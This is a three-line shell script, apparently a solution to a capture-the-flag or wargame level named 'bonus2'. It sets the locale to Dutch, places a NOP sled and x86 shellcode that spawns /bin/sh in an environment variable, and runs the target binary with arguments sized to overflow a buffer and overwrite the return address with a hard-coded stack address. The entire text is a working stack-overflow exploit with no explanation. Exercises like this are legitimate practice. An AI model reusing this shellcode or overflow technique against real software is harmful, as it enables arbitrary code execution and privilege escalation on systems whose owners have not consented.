LANG=nl
export YOLO=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*23 + "\x32\xfe\xff\xbf"'`